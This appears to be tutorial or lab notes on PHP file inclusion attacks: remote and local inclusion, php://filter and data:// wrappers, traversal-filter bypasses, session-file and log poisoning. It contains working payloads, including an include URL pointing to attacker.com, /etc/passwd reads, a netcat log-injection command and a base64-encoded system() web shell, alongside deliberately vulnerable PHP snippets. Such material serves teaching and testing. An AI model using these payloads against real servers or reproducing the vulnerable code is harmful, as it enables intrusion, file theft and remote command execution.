## 📁 File Inclusion And Pathing Basics

A traversal string, typically represented as `../`, is utilized in path traversal attacks to navigate through a filesystem directory structure. It forces the system to move one directory level up, permitting unauthorized access to files outside the intended web root or application directory.

Relative pathing determines file locations based on the current working directory. For instance, `include('./folder/file.php')` targets `file.php` within the `folder` directory located in the same directory as the executing script.

Absolute pathing defines the complete filesystem path originating from the root directory, such as `/var/www/html/folder/file.php`.



## 🌐 Remote File Inclusion

Remote File Inclusion (RFI) is a vulnerability permitting attackers to dynamically include remote files via input manipulation. This flaw facilitates the execution of external malicious scripts on the target server.

RFI frequently manifests in applications that dynamically load external resources. By manipulating request parameters, an attacker redirects the application to external malicious infrastructure.

~~~http
# Exploiting a GET parameter to include an external remote script
include.php?page=http://attacker.com/exploit.php
~~~
* Tool: HTTP

## 💻 Local File Inclusion

Local File Inclusion (LFI) occurs when unvalidated or poorly sanitized input fields are exploited to manipulate file paths, allowing attackers to access or execute local files on the server. The primary objective is to access restricted data utilizing traversal strings.

~~~http
# Utilizing a directory traversal sequence to access the local password file
include.php?page=../../../../etc/passwd
~~~
* Tool: HTTP

While LFI results in unauthorized file access, it can be escalated to Remote Code Execution (RCE). Escalation is possible if the attacker injects executable code into a local file that is subsequently included by the application.

## 🐘 PHP Wrappers And Filters

PHP wrappers provide access to diverse data streams and internal protocols. If inadequately secured, these wrappers permit unauthorized file access and code execution. 

The `php://filter` stream wrapper allows data modification operations before read/write processes occur. In an LFI context, attackers use filters like `convert.base64-encode` to read source code or sensitive files without triggering execution.

~~~http
# Employing the PHP base64 conversion filter to extract local file contents
http://10.66.149.254/playground.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
~~~
* Tool: HTTP / PHP

The server returns the base64-encoded string of the requested file, which can be decoded locally.

The following table illustrates the application of various PHP string filters on an `.htaccess` file:

| Payload | Output |
| --- | --- |
| `php://filter/convert.base64-encode/resource=.htaccess` | UmV3cml0ZUVuZ2luZSBvbgpPcHRpb25zIC1JbmRleGVz |
| `php://filter/string.rot13/resource=.htaccess` | ErjevgrRatvar ba Bcgvbaf -Vaqrkrf |
| `php://filter/string.toupper/resource=.htaccess` | REWRITEENGINE ON OPTIONS -INDEXES |
| `php://filter/string.tolower/resource=.htaccess` | rewriteengine on options -indexes |
| `php://filter/string.strip_tags/resource=.htaccess` | RewriteEngine on Options -Indexes |
| No filter applied | RewriteEngine on Options -Indexes |

The `data://` wrapper facilitates inline data embedding. Attackers use it to inject and execute PHP code directly via the URL parameter.

~~~http
# Embedding inline PHP code using the data stream wrapper
http://10.66.149.254/playground.php?page=data:text/plain,<?php%20phpinfo();%20?>
~~~
* Tool: HTTP / PHP

Payload Breakdown:
* `data:` initiates the URL schema.
* MIME-type is specified as `text/plain`.
* The embedded data payload is `<?php phpinfo(); ?>`.



## 🛡️ Filter Bypass And Obfuscation

Applications frequently deploy filtering mechanisms to block directory traversal sequences (e.g., stripping `../` or enforcing base directories). These defenses can be bypassed using strategic obfuscation.

Consider a PHP function validating that a requested file resides within a mandatory base directory (`/var/www/html`) and stripping exact `../..` sequences.

~~~php
# PHP code enforcing a base directory and stripping specific traversal sequences
function containsStr($str, $subStr){
    return strpos($str, $subStr) !== false;
}

if(isset($_GET['page'])){
    if(!containsStr($_GET['page'], '../..') && containsStr($_GET['page'], '/var/www/html')){
        include $_GET['page'];
    }else{ 
        echo 'You are not allowed to go outside /var/www/html/ directory!';
    }
}
~~~
* Tool: PHP

This filter can be evaded using the `..//..//` sequence appended to the mandatory base folder.

~~~http
# Bypassing the traversal filter using excessive slashes
http://10.66.149.254/lfi.php?page=/var/www/html/..//..//..//etc/passwd
~~~
* Tool: HTTP

The filter fails because `..//..//` does not strictly match `../..`. The underlying filesystem processes the sequential slashes `//` as a single directory separator, making it functionally equivalent to a standard traversal sequence.

Standard obfuscation techniques against basic filters:
* URL Encoded Bypass: Transmitting the payload as `%2e%2e%2f` to bypass literal string matching.
* Double Encoded Bypass: Effective against applications performing recursive decoding. The payload `%252e%252e%252f` decodes to `%2e%2e%2f` on the first pass, and `../` on the second.
* Obfuscation/Nesting: Submitting `....//`. If the application explicitly strips `../`, the remaining characters collapse into a valid `../` sequence.

~~~php
# Weak PHP LFI mitigation script vulnerable to nested sequence obfuscation
$file = $_GET['file'];
$file = str_replace('../', '', $file);
include('files/' . $file);
~~~
* Tool: PHP

## 🍪 PHP Session File Exploitation

PHP session files store serialized state data on the server filesystem. If session data is user-controllable and an LFI vulnerability exists, an attacker can achieve RCE by injecting malicious code into the session file and subsequently including it.

~~~php
# Vulnerable PHP application reflecting GET parameters into session storage
if(isset($_GET['page'])){
    $_SESSION['page'] = $_GET['page'];
    echo "You're currently in" . $_GET["page"];
    include($_GET['page']);
}
~~~
* Tool: PHP

Injection process:
1. Inject PHP payload into the session via the vulnerable parameter: `?page=<?php echo phpinfo(); ?>`.
2. Extract the active session ID from the `PHPSESSID` cookie.
3. Include the targeted session file using the LFI vector.

~~~http
# Executing injected session payload via local file inclusion
sessions.php?page=/var/lib/php/sessions/sess_[sessionID]
~~~
* Tool: HTTP



## 📜 Log Poisoning

Log poisoning entails injecting executable code into a web server's logging facility (e.g., access.log, error.log) and executing it via an LFI vulnerability. This technique leverages legitimate server operations to store malicious payloads.

Injection methods include transmitting payloads via manipulated User-Agent strings, Referer headers, or direct URL requests.

~~~bash
# Utilizing Netcat to inject a raw PHP payload into the Apache access log
nc 10.66.149.254 80      
<?php echo phpinfo(); ?>
~~~
* Tool: Netcat

The server rejects the malformed request but logs the payload into the access log.

~~~http
# Server response acknowledging the malformed request that will be logged
HTTP/1.1 400 Bad Request
Date: Thu, 23 Nov 2023 05:39:55 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 335
Connection: close
Content-Type: text/html; charset=iso-8859-1
~~~
* Tool: HTTP

Once logged, the LFI vulnerability is used to target the log file path, executing the injected code.

~~~http
# Triggering the poisoned Apache access log via LFI
?page=/var/log/apache2/access.log
~~~
* Tool: HTTP

## ⚙️ Advanced PHP Wrapper Code Execution

The `php://filter` stream wrapper can be leveraged for direct code execution by supplying a base64-encoded PHP payload and passing it through the `convert.base64-decode` filter.

Target Payload: `<?php system($_GET['cmd']); echo 'Shell done!'; ?>`

~~~http
# Executing a base64-encoded web shell via the PHP decode filter
http://10.66.149.254/playground.php?page=php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+
~~~
* Tool: HTTP / PHP

Payload Components:

| Position | Field | Value |
| --- | --- | --- |
| 1 | Protocol Wrapper | `php://filter` |
| 2 | Filter | `convert.base64-decode` |
| 3 | Resource Type | `resource=` |
| 4 | Data Type | `data://plain/text,` |
| 5 | Encoded Payload | `PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+` |

The server processes the request, decodes the base64 string, and executes the raw PHP code. The `&cmd=` parameter must be appended carefully; incorporating it directly into the base64 input sequence will corrupt the decoding process and result in an invalid byte sequence error.
